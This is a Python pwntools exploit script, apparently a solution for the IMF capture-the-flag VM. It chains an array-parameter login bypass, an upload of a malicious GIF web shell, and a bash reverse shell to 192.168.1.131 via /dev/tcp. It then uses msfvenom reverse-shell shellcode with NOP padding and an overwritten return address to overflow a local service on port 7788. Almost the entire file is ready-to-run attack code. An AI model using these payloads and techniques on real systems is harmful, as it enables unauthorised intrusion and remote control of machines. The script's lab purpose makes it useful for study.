#!/usr/bin/python3

from pwn import *
import time, pdb, signal, sys, requests, re, threading

# Usage
if len(sys.argv) != 3:
	print("\n\n[+] Uso:")
	print("\t" + sys.argv[0] + " ip rce.gif\n")
	sys.exit(1)

# Ctrl + C
def defhandler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)
signal.signal(signal.SIGINT, defhandler)

# Variables
ip = sys.argv[1]
gif = sys.argv[2]
login_url = 'http://' + ip + '/imfadministrator/index.php'
upload_url = 'http://' + ip + '/imfadministrator/uploadr942.php'

# exploit
def main():

	# login
	s = requests.session()

	data = {
		'user': 'rmichaels',
		'pass[]': 'asdf'
	}

	r = s.post(login_url, data=data)

	# upload malicius GIF file for RCE
	file = open(gif, 'rb')

	r = s.post(upload_url, files={'file': ('reverse.gif', file, 'image/gif')}, data={'submit': 'Upload'})

	rce_file = re.findall(r'<!-- (.*?) -->', r.text)[0]

	rce_path = 'http://' + ip + '/imfadministrator/uploads/' + rce_file + '.gif'

	# RCE
	r = s.get(rce_path + '?cmd=bash -c "bash -i %26> /dev/tcp/192.168.1.131/443 0>%261"')

def genBuf():

	#-------------------
	# CHANGE ME
	# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f python -b "\x00\x0a\x0d"
	buf =  b""
	buf += b"\xbf\x9e\x51\x1a\x09\xda\xda\xd9\x74\x24\xf4\x58"
	buf += b"\x33\xc9\xb1\x12\x83\xe8\xfc\x31\x78\x0e\x03\xe6"
	buf += b"\x5f\xf8\xfc\x27\xbb\x0b\x1d\x14\x78\xa7\x88\x98"
	buf += b"\xf7\xa6\xfd\xfa\xca\xa9\x6d\x5b\x65\x96\x5c\xdb"
	buf += b"\xcc\x90\xa7\xb3\x0e\xca\x59\xc0\xe7\x09\x5a\xd7"
	buf += b"\xab\x84\xbb\x67\x35\xc7\x6a\xd4\x09\xe4\x05\x3b"
	buf += b"\xa0\x6b\x47\xd3\x55\x43\x1b\x4b\xc2\xb4\xf4\xe9"
	buf += b"\x7b\x42\xe9\xbf\x28\xdd\x0f\x8f\xc4\x10\x4f"
	#-------------------
	
	buf += b'\x90' * (168 - len(buf))

	buf += b'\x63\x85\x04\x08'

	return buf

# main
if __name__ == '__main__':

	buf = genBuf()

	try:
		threading.Thread(target=main, args=()).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(443, timeout=20).wait_for_connection()

	shell.sendline(b'nc localhost 7788')
	shell.sendline(b'48093572')
	shell.sendline(b'3')

	shell.sendline(buf)

	shell.interactive()
